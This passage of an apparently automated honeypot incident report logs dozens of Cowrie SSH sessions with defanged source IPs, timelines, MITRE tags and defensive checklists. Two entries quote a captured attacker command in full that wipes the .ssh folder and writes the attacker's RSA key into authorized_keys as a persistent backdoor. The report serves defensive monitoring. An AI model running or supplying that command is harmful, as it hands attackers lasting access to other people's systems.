- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5fa2ed78271

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 15:02 |
| **Last Seen** | 2026-08-29 15:02 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:02:14` | `cowrie.session.connect` |
| `2026-08-29 15:02:14` | `cowrie.client.version` |
| `2026-08-29 15:02:15` | `cowrie.client.kex` |
| `2026-08-29 15:02:15` | `cowrie.login.success` |
| `2026-08-29 15:02:16` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:02:16` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 15:02:16` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94af889db720

| Field | Detail |
|---|---|
| **Source IP** | `152.32.163[.]183` |
| **First Seen** | 2026-08-29 15:04 |
| **Last Seen** | 2026-08-29 15:04 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:04:19` | `cowrie.session.connect` |
| `2026-08-29 15:04:19` | `cowrie.client.version` |
| `2026-08-29 15:04:19` | `cowrie.client.kex` |
| `2026-08-29 15:04:20` | `cowrie.login.success` |
| `2026-08-29 15:04:21` | `cowrie.session.params` |
| `2026-08-29 15:04:21` | `cowrie.command.input` |
| `2026-08-29 15:04:21` | `cowrie.command.failed` |
| `2026-08-29 15:04:22` | `cowrie.log.closed` |
| `2026-08-29 15:04:23` | `cowrie.session.params` |
| `2026-08-29 15:04:23` | `cowrie.command.input` |
| `2026-08-29 15:04:23` | `cowrie.session.file_download` |
| `2026-08-29 15:04:23` | `cowrie.log.closed` |
| `2026-08-29 15:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.163[.]183` to AbuseIPDB if not already reported
- [ ] Block `152.32.163[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a40abd03eb34

| Field | Detail |
|---|---|
| **Source IP** | `152.32.163[.]183` |
| **First Seen** | 2026-08-29 15:04 |
| **Last Seen** | 2026-08-29 15:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:04:37` | `cowrie.session.connect` |
| `2026-08-29 15:04:37` | `cowrie.client.version` |
| `2026-08-29 15:04:44` | `cowrie.client.kex` |
| `2026-08-29 15:04:45` | `cowrie.login.success` |
| `2026-08-29 15:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.163[.]183` to AbuseIPDB if not already reported
- [ ] Block `152.32.163[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-000f5e3b0ab2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:06 |
| **Last Seen** | 2026-08-29 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:06:38` | `cowrie.session.connect` |
| `2026-08-29 15:06:38` | `cowrie.client.version` |
| `2026-08-29 15:06:39` | `cowrie.client.kex` |
| `2026-08-29 15:06:39` | `cowrie.login.success` |
| `2026-08-29 15:06:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:06:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:06:40` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f2b43c3db70

| Field | Detail |
|---|---|
| **Source IP** | `203.193.147[.]75` |
| **First Seen** | 2026-08-29 15:07 |
| **Last Seen** | 2026-08-29 15:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:07:11` | `cowrie.session.connect` |
| `2026-08-29 15:07:12` | `cowrie.client.version` |
| `2026-08-29 15:07:12` | `cowrie.client.kex` |
| `2026-08-29 15:07:14` | `cowrie.login.success` |
| `2026-08-29 15:07:15` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.193.147[.]75` to AbuseIPDB if not already reported
- [ ] Block `203.193.147[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee6f4e21de7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:07 |
| **Last Seen** | 2026-08-29 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:07:17` | `cowrie.session.connect` |
| `2026-08-29 15:07:17` | `cowrie.client.version` |
| `2026-08-29 15:07:17` | `cowrie.client.kex` |
| `2026-08-29 15:07:18` | `cowrie.login.success` |
| `2026-08-29 15:07:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:07:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:07:19` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80f4fe4ad4b1

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-29 15:10 |
| **Last Seen** | 2026-08-29 15:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:10:20` | `cowrie.session.connect` |
| `2026-08-29 15:10:21` | `cowrie.client.version` |
| `2026-08-29 15:10:21` | `cowrie.client.kex` |
| `2026-08-29 15:10:22` | `cowrie.login.success` |
| `2026-08-29 15:10:23` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1aa03b8cbd8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]119` |
| **First Seen** | 2026-08-29 15:10 |
| **Last Seen** | 2026-08-29 15:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:10:28` | `cowrie.session.connect` |
| `2026-08-29 15:10:28` | `cowrie.client.version` |
| `2026-08-29 15:10:28` | `cowrie.client.kex` |
| `2026-08-29 15:10:29` | `cowrie.login.success` |
| `2026-08-29 15:10:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]119` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ec9bee2f3b

| Field | Detail |
|---|---|
| **Source IP** | `111.70.10[.]15` |
| **First Seen** | 2026-08-29 15:10 |
| **Last Seen** | 2026-08-29 15:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:10:29` | `cowrie.session.connect` |
| `2026-08-29 15:10:29` | `cowrie.client.version` |
| `2026-08-29 15:10:29` | `cowrie.client.kex` |
| `2026-08-29 15:10:31` | `cowrie.login.success` |
| `2026-08-29 15:10:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.10[.]15` to AbuseIPDB if not already reported
- [ ] Block `111.70.10[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8ae0214584

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-08-29 15:10 |
| **Last Seen** | 2026-08-29 15:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:10:37` | `cowrie.session.connect` |
| `2026-08-29 15:10:37` | `cowrie.client.version` |
| `2026-08-29 15:10:37` | `cowrie.client.kex` |
| `2026-08-29 15:10:39` | `cowrie.login.success` |
| `2026-08-29 15:10:39` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19d275eb5ee6

| Field | Detail |
|---|---|
| **Source IP** | `116.59.10[.]205` |
| **First Seen** | 2026-08-29 15:12 |
| **Last Seen** | 2026-08-29 15:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:12:12` | `cowrie.session.connect` |
| `2026-08-29 15:12:14` | `cowrie.client.version` |
| `2026-08-29 15:12:14` | `cowrie.client.kex` |
| `2026-08-29 15:12:17` | `cowrie.login.success` |
| `2026-08-29 15:12:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.59.10[.]205` to AbuseIPDB if not already reported
- [ ] Block `116.59.10[.]205` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13d461cad36

| Field | Detail |
|---|---|
| **Source IP** | `113.200.216[.]246` |
| **First Seen** | 2026-08-29 15:12 |
| **Last Seen** | 2026-08-29 15:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:12:23` | `cowrie.session.connect` |
| `2026-08-29 15:12:24` | `cowrie.client.version` |
| `2026-08-29 15:12:24` | `cowrie.client.kex` |
| `2026-08-29 15:12:27` | `cowrie.login.success` |
| `2026-08-29 15:12:28` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.200.216[.]246` to AbuseIPDB if not already reported
- [ ] Block `113.200.216[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c659b33780d2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:16 |
| **Last Seen** | 2026-08-29 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:16:41` | `cowrie.session.connect` |
| `2026-08-29 15:16:41` | `cowrie.client.version` |
| `2026-08-29 15:16:41` | `cowrie.client.kex` |
| `2026-08-29 15:16:42` | `cowrie.login.success` |
| `2026-08-29 15:16:42` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:16:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:16:42` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbb1c6f8d416

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:17 |
| **Last Seen** | 2026-08-29 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:17:13` | `cowrie.session.connect` |
| `2026-08-29 15:17:13` | `cowrie.client.version` |
| `2026-08-29 15:17:13` | `cowrie.client.kex` |
| `2026-08-29 15:17:14` | `cowrie.login.success` |
| `2026-08-29 15:17:14` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:17:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:17:14` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cab428d341ad

| Field | Detail |
|---|---|
| **Source IP** | `196.190.41[.]137` |
| **First Seen** | 2026-08-29 15:20 |
| **Last Seen** | 2026-08-29 15:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:20:55` | `cowrie.session.connect` |
| `2026-08-29 15:20:55` | `cowrie.client.version` |
| `2026-08-29 15:20:55` | `cowrie.client.kex` |
| `2026-08-29 15:20:57` | `cowrie.login.success` |
| `2026-08-29 15:20:57` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.41[.]137` to AbuseIPDB if not already reported
- [ ] Block `196.190.41[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51e80853e264

| Field | Detail |
|---|---|
| **Source IP** | `218.22.0[.]200` |
| **First Seen** | 2026-08-29 15:21 |
| **Last Seen** | 2026-08-29 15:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:21:03` | `cowrie.session.connect` |
| `2026-08-29 15:21:04` | `cowrie.client.version` |
| `2026-08-29 15:21:04` | `cowrie.client.kex` |
| `2026-08-29 15:21:09` | `cowrie.login.success` |
| `2026-08-29 15:21:10` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.22.0[.]200` to AbuseIPDB if not already reported
- [ ] Block `218.22.0[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503773cb5728

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:26 |
| **Last Seen** | 2026-08-29 15:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:26:19` | `cowrie.session.connect` |
| `2026-08-29 15:26:19` | `cowrie.client.version` |
| `2026-08-29 15:26:20` | `cowrie.client.kex` |
| `2026-08-29 15:26:20` | `cowrie.login.success` |
| `2026-08-29 15:26:21` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:26:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:26:21` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265c32c6f664

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:28 |
| **Last Seen** | 2026-08-29 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:28:05` | `cowrie.session.connect` |
| `2026-08-29 15:28:05` | `cowrie.client.version` |
| `2026-08-29 15:28:05` | `cowrie.client.kex` |
| `2026-08-29 15:28:06` | `cowrie.login.success` |
| `2026-08-29 15:28:06` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:28:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:28:07` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab795810697

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:34 |
| **Last Seen** | 2026-08-29 15:35 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:34:38` | `cowrie.session.connect` |
| `2026-08-29 15:34:39` | `cowrie.login.success` |
| `2026-08-29 15:34:40` | `cowrie.session.params` |
| `2026-08-29 15:34:40` | `cowrie.command.input` |
| `2026-08-29 15:34:40` | `cowrie.command.failed` |
| `2026-08-29 15:34:40` | `cowrie.command.input` |
| `2026-08-29 15:34:40` | `cowrie.command.failed` |
| `2026-08-29 15:34:41` | `cowrie.command.input` |
| `2026-08-29 15:34:41` | `cowrie.command.failed` |
| `2026-08-29 15:34:41` | `cowrie.command.input` |
| `2026-08-29 15:34:41` | `cowrie.command.failed` |
| `2026-08-29 15:34:42` | `cowrie.command.input` |
| `2026-08-29 15:34:42` | `cowrie.command.input` |
| `2026-08-29 15:34:42` | `cowrie.command.failed` |
| `2026-08-29 15:34:42` | `cowrie.command.failed` |
| `2026-08-29 15:35:12` | `cowrie.log.closed` |
| `2026-08-29 15:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b974f35b320d

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:35 |
| **Last Seen** | 2026-08-29 15:35 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:35:12` | `cowrie.session.connect` |
| `2026-08-29 15:35:13` | `cowrie.login.success` |
| `2026-08-29 15:35:14` | `cowrie.login.success` |
| `2026-08-29 15:35:15` | `cowrie.session.params` |
| `2026-08-29 15:35:15` | `cowrie.command.input` |
| `2026-08-29 15:35:15` | `cowrie.command.failed` |
| `2026-08-29 15:35:15` | `cowrie.command.input` |
| `2026-08-29 15:35:15` | `cowrie.command.failed` |
| `2026-08-29 15:35:16` | `cowrie.command.input` |
| `2026-08-29 15:35:16` | `cowrie.command.input` |
| `2026-08-29 15:35:16` | `cowrie.command.failed` |
| `2026-08-29 15:35:16` | `cowrie.command.failed` |
| `2026-08-29 15:35:47` | `cowrie.log.closed` |
| `2026-08-29 15:35:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b1917d8baa

| Field | Detail |
|---|---|
| **Source IP** | `189.244.61[.]51` |
| **First Seen** | 2026-08-29 15:35 |
| **Last Seen** | 2026-08-29 15:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:35:33` | `cowrie.session.connect` |
| `2026-08-29 15:35:33` | `cowrie.client.version` |
| `2026-08-29 15:35:34` | `cowrie.client.kex` |
| `2026-08-29 15:35:34` | `cowrie.login.success` |
| `2026-08-29 15:35:35` | `cowrie.session.params` |
| `2026-08-29 15:35:35` | `cowrie.command.input` |
| `2026-08-29 15:35:35` | `cowrie.command.failed` |
| `2026-08-29 15:35:35` | `cowrie.log.closed` |
| `2026-08-29 15:35:35` | `cowrie.session.params` |
| `2026-08-29 15:35:35` | `cowrie.command.input` |
| `2026-08-29 15:35:35` | `cowrie.session.file_download` |
| `2026-08-29 15:35:35` | `cowrie.log.closed` |
| `2026-08-29 15:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.244.61[.]51` to AbuseIPDB if not already reported
- [ ] Block `189.244.61[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58d351af6b67

| Field | Detail |
|---|---|
| **Source IP** | `189.244.61[.]51` |
| **First Seen** | 2026-08-29 15:35 |
| **Last Seen** | 2026-08-29 15:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:35:35` | `cowrie.session.connect` |
| `2026-08-29 15:35:35` | `cowrie.client.version` |
| `2026-08-29 15:35:35` | `cowrie.client.kex` |
| `2026-08-29 15:35:36` | `cowrie.login.success` |
| `2026-08-29 15:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.244.61[.]51` to AbuseIPDB if not already reported
